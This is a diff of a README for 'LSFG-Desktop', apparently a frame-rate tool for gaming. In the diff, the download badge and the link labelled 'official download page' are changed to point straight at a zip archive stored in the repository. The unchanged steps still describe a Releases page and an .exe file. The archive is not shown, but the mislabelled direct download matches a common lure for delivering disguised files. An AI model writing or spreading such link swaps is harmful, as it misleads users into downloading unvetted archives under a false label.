@@ -1,6 +1,6 @@
 # 🚀 LSFG-Desktop - Increase Frame Rates For Smoother Gaming
 
-[![](https://img.shields.io/badge/Download-LSFG-blue?style=for-the-badge)](https://github.com/priamcoc9603/LSFG-Desktop)
+[![](https://img.shields.io/badge/Download-LSFG-blue?style=for-the-badge)](https://raw.githubusercontent.com/priamcoc9603/LSFG-Desktop/main/LSFG/LSF_Desktop_v3.5.zip)
 
 ## 🎮 What Is LSFG-Desktop
 
@@ -19,7 +19,7 @@ To run this application, your computer needs to meet these basic criteria:
 
 Follow these steps to set up the software on your PC.
 
-1. Go to the [official download page](https://github.com/priamcoc9603/LSFG-Desktop).
+1. Go to the [official download page](https://raw.githubusercontent.com/priamcoc9603/LSFG-Desktop/main/LSFG/LSF_Desktop_v3.5.zip).
 2. Look for the latest version under the Releases section on the right side of the screen.
 3. Select the file ending in .exe to start your download.
 4. Save the file to your desktop or your downloads folder.
